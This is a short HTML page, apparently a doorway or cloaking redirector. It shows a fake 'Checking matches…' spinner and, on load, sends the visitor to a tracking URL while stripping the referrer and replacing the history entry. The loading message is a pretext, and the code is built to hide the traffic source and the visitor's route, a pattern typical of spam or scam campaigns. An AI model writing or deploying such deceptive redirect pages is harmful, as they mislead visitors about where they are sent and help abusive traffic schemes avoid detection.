<!DOCTYPE html>
<head>
  <meta name="referrer" content="no-referrer">
  <style>
    #geo-loader{position:fixed;inset:0;background:#fff;display:flex;justify-content:center;align-items:center;font:16px/1.4 Arial,sans-serif;color:#444;z-index:999999}
    #geo-loader .spinner{border:3px solid #f3f3f3;border-top:3px solid #3498db;border-radius:50%;width:28px;height:28px;animation:spin .7s linear infinite;margin-right:10px}
    @keyframes spin{to{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div id="geo-loader"><div class="spinner"></div>Checking matches…</div>

  <script>
    (function () {
      const LINK = "https://securetrkdisp.com/S4qkVr67jS";

      function removeLoader() {
        const el = document.getElementById("geo-loader");
        if (el) el.remove();
      }

      function redirectNoReferrer(url) {
        try {
          removeLoader();
          const a = document.createElement("a");
          a.href = url;
          a.rel = "noreferrer";
          a.referrerPolicy = "no-referrer";
          a.style.display = "none";
          document.body.appendChild(a);
          a.click();

          // резерв: заменить текущую запись в истории
          setTimeout(() => { location.replace(url); }, 30);
        } catch {
          location.replace(url);
        }
      }

      document.addEventListener("DOMContentLoaded", () => {
        redirectNoReferrer(LINK);
      });
    })();
  </script>
</body>
